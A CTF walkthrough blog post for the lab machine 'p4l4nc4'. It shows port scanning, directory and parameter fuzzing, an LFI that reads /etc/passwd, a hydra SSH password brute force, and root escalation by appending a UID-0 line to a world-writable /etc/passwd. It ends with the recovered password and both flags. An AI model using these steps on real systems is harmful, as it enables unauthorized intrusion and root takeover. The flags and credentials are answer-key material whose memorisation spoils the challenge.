+++
title = "p4l4nc4 (Palanca) - Walkthrough"
date = "2026-07-18"
author = "nvru"
description = "Walkthrough for the p4l4nc4 (Palanca) machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "apache",
  "lfi",
  "ssh",
  "privilege-escalation"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.27`

The objective was to enumerate the target, identify exposed services, gain initial access through a Local File Inclusion (LFI) vulnerability, and escalate privileges by abusing insecure permissions on `/etc/passwd`.

![Machine information](/images/hmv/p4l4nc4/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.27 -- -sC -sV -A -oA nmap/rust
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```

Only SSH and an Apache web server were exposed, making the web service the obvious starting point.

---

## Enumeration

### HTTP Enumeration

Browsing the web server revealed only the default Apache Debian page.

![HTTP page](/images/hmv/p4l4nc4/http.png)

The page source did not contain anything interesting.

Checking `robots.txt` revealed a long Portuguese text, but nothing immediately useful.

![robots.txt](/images/hmv/p4l4nc4/robots.png)

---

### Directory Enumeration

Since the default page did not reveal anything useful, I started directory brute forcing.

```bash
gobuster dir \
-u http://10.10.10.27/ \
-w /opt/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
-x html,php,js,txt,sql,xml
```

No interesting files or directories were discovered.

Because the text inside `robots.txt` looked unusual, I generated a custom wordlist using CeWL.

```bash
cewl -m 5 http://10.10.10.27/robots.txt > misc/wordlist

gobuster dir \
-u http://10.10.10.27/ \
-w misc/wordlist \
-x html,php,js,txt,sql,xml
```

This also failed to discover anything.

I then suspected the hidden content might be encoded using leetspeak. CyberChef did not produce useful results, so I manually converted the words using `sed`.

```bash
cat misc/wordlist \
| sed 's/a/4/g' \
| sed 's/e/3/g' \
| sed 's/i/1/g' \
| sed 's/l/1/g' \
| sed 's/o/0/g' \
| sed 's/s/5/g' \
| sed 's/t/7/g' \
| sort | uniq | tr A-Z a-z \
> misc/wordlist_leet_lower
```

Using the new wordlist revealed a hidden directory.

```text
/n3gr4/
```

![Hidden directory](/images/hmv/p4l4nc4/dir_n3gr4.png)

Browsing the directory showed an empty page.

![Hidden directory page](/images/hmv/p4l4nc4/curl_n3gr4.png)

Running Gobuster again against this directory with the manually generated wordlist finally discovered an interesting PHP file.

```text
m414nj3.php
```

The page returned HTTP status code **500**, indicating that it was likely expecting user input.

![Discovered PHP file](/images/hmv/p4l4nc4/found_m414nj3.png)

---

### Local File Inclusion (LFI)

The first assumption was that the page could be vulnerable to Local File Inclusion.

To identify the parameter name, I fuzzed common parameter names.

```bash
ffuf \
-w /opt/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-u 'http://10.10.10.27/n3gr4/m414nj3.php?FUZZ=/etc/passwd' \
-fs 0
```

The parameter was identified as:

```text
page
```

![Parameter discovery](/images/hmv/p4l4nc4/found_param.png)

Using the parameter successfully disclosed `/etc/passwd`, confirming the LFI vulnerability.

Among the system users, one account stood out:

```text
p4l4nc4
```

![Parameter discovery](/images/hmv/p4l4nc4/etc_passwd.png)

---

### Reading Sensitive Files

After confirming the LFI, I continued reading sensitive files.

Files attempted:

```text
/etc/passwd
```

The LFI exposed the local user `p4l4nc4`, which became the target for the next stage of the attack.

---

## Initial Access

Since SSH was available, I attempted to brute-force the discovered user with a small RockYou-based wordlist.

```bash
hydra -l p4l4nc4 -P /opt/wordlists/rockyou-75.txt ssh://10.10.10.27
```

The password was recovered successfully.

```text
Username: p4l4nc4
Password: friendster
```

![Hydra](/images/hmv/p4l4nc4/hydra.png)

Logging in through SSH succeeded.

![SSH login](/images/hmv/p4l4nc4/ssh.png)

---

## Privilege Escalation

### p4l4nc4 → root

The first step was checking sudo permissions.

```bash
sudo -l
```

The user had no sudo privileges.

![sudo permissions](/images/hmv/p4l4nc4/sudo_perm.png)

Next, I enumerated the user's home directory.

```bash
ls -la
```

I found a `.bash_history` file.

![Home directory](/images/hmv/p4l4nc4/ls_home.png)

Reviewing the command history revealed that `/etc/passwd` had previously been made world writable.

```text
chmod 666 /etc/passwd
```

![History](/images/hmv/p4l4nc4/hist_passwd.png)

Checking the file permissions confirmed that the file was still writable by any user.

![Writable passwd](/images/hmv/p4l4nc4/passwd_perm.png)

Since `/etc/passwd` was writable, I generated a password hash and created a new root-level user.

```bash
mkpasswd void
```

Then I appended the new user to `/etc/passwd`.

```text
void:<password_hash>:0:0:root:/root:/bin/bash
```

![Add user](/images/hmv/p4l4nc4/add_user.png)

After switching to the newly created account, I obtained a root shell.

![Root shell](/images/hmv/p4l4nc4/root.png)

---

## Credentials

```text
p4l4nc4:friendster
```

---

## Flags

```text
user:HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}

root:HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}
```
